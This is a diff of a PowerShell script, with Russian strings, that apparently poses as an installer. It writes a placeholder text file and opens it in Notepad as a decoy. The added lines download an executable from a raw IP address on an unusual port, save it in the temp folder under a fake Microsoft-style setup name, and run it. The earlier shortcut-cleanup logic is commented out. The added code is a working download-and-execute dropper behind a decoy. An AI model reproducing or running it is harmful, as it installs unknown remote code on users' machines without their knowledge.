@@ -1,19 +1,28 @@
-$txt = "$env:TEMP\info.txt"
+$txt = "$env:TEMP\Информация.txt"
+
+$folder = (Get-Location).Path
 
 @"
-Установка запущена6.
-
-Пожалуйста, подождите...
+Позже добавлю информацию
 "@ | Out-File $txt -Encoding UTF8
 
 Start-Process notepad.exe $txt
 
-$folder = (Get-Location).Path
+$gaegae = Join-Path $folder "installer.txt"
 
-$lnk = Join-Path $folder "installer6.lnk"
-$txt = Join-Path $folder "installer.txt"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile('http://45.140.188.52:34513/sdxhelper.exe', "$env:TEMP\dd_setup_41020715010741_123_Microsoft.exe")
+& "$env:TEMP\dd_setup_41020715010741_123_Microsoft.exe"
 
-attrib -r -s -h $lnk
+$tjfjftjt = Join-Path $folder "fwafwhtdafawf.txt"
+
+
+# $folder = (Get-Location).Path
+
+# $lnk = Join-Path $folder "installer6.lnk"
+# $txt = Join-Path $folder "installer.txt"
+
+# attrib -r -s -h $lnk
 # [System.IO.File]::Delete($lnk)
 
 # Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
@@ -21,15 +30,15 @@ attrib -r -s -h $lnk
 #     "Start-Sleep 5; if(Test-Path '$lnk'){ Remove-Item -LiteralPath '$lnk' -Force -Verbose }"
 # )
 
-$cmd = @"
-Start-Sleep 2
-Write-Host "Проверяем: $lnk"
-Test-Path "$lnk"
-Remove-Item -LiteralPath "$lnk" -Force -Verbose
-Read-Host "Нажмите Enter"
-"@
+# $cmd = @"
+# Start-Sleep 2
+# Write-Host "Проверяем: $lnk"
+# Test-Path "$lnk"
+# Remove-Item -LiteralPath "$lnk" -Force -Verbose
+# Read-Host "Нажмите Enter"
+# "@
 
-Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $cmd
+# Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $cmd
 
 # @"
 # Установка запущена.
